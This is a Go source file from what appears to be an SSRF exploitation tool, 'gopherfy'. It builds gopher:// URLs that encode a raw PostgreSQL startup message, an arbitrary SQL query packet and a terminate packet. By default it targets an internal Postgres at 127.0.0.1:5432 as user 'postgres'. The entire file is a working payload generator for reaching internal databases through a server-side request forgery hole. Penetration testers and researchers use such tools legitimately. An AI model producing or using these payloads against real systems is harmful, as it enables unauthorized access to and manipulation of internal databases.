package postgres

import (
	"fmt"
	"strings"

	"github.com/hupe1980/gopherfy/internal"
)

const (
	DefaultAddr = "127.0.0.1:5432"
	DefaultUser = "postgres"
)

type Options struct {
	Addr  string
	User  string
	DB    string
	Query string
}

type Postgres struct {
	addr  string
	user  string
	db    string
	query string
}

func NewPostgres(optFns ...func(o *Options)) *Postgres {
	options := Options{
		Addr: DefaultAddr,
		User: DefaultUser,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &Postgres{
		addr:  strings.TrimSpace(options.Addr),
		user:  strings.TrimSpace(options.User),
		db:    strings.TrimSpace(options.DB),
		query: strings.TrimSpace(options.Query),
	}
}

func (p *Postgres) Payload() string {
	payload := p.generateStartupMessage()

	payload += p.generateQuery()

	payload += p.generateTerminate()

	payload = fmt.Sprintf("%%%s", internal.InsertNth(payload, '%', 2))

	return fmt.Sprintf("gopher://%s/_%s", p.addr, payload)
}

func (p *Postgres) generateStartupMessage() string {
	pktLen := 4 + len(p.user) + 13

	if n := len(p.db); n > 0 {
		pktLen += n + 8
	}

	data := make([]byte, pktLen)
	data[0] = 0x00
	data[1] = 0x00
	data[2] = 0x00

	pos := 3

	data[pos] = byte(pktLen)
	pos++

	data[pos] = 0x00
	pos++

	data[pos] = 0x03
	pos++

	data[pos] = 0x00
	pos++

	data[pos] = 0x00
	pos++
	pos += copy(data[pos:], "user")

	data[pos] = 0x00
	pos++
	pos += copy(data[pos:], p.user)

	if len(p.db) > 0 {
		data[pos] = 0x00
		pos++
		pos += copy(data[pos:], "database")

		data[pos] = 0x00
		pos++
		pos += copy(data[pos:], p.db)
	}

	data[pos] = 0x00
	pos++

	data[pos] = 0x00
	pos++

	return fmt.Sprintf("%x", data[:pos])
}

func (p *Postgres) generateQuery() string {
	pktLen := 1 + 4 + len(p.query)

	data := make([]byte, pktLen+1)

	data[0] = byte('Q')
	data[1] = 0x00
	data[2] = 0x00
	data[3] = 0x00
	data[4] = byte(pktLen)

	pos := 5
	pos += copy(data[pos:], []byte(p.query))

	data[pos] = 0x00
	pos++

	return fmt.Sprintf("%x", data[:pos])
}

func (p *Postgres) generateTerminate() string {
	pktLen := 4

	data := make([]byte, pktLen+1)

	data[0] = byte('X')
	data[1] = 0x00
	data[2] = 0x00
	data[3] = 0x00
	data[4] = byte(pktLen)

	return fmt.Sprintf("%x", data)
}
